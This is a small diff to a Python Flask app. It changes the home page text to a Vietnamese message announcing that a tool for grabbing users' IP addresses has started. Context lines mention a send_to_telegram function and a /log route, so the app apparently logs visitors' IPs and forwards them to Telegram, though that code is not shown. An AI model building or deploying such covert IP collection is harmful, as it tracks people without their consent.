@@ -23,7 +23,7 @@ def send_to_telegram(ip):
 
 @app.route("/")
 def home():
-    return "Flask server is running!"
+    return "Đã Khởi Động Thành Công Tool Lấy IP Người Dùng"
 
 @app.route("/log", methods=["GET"])
 def log_ip():
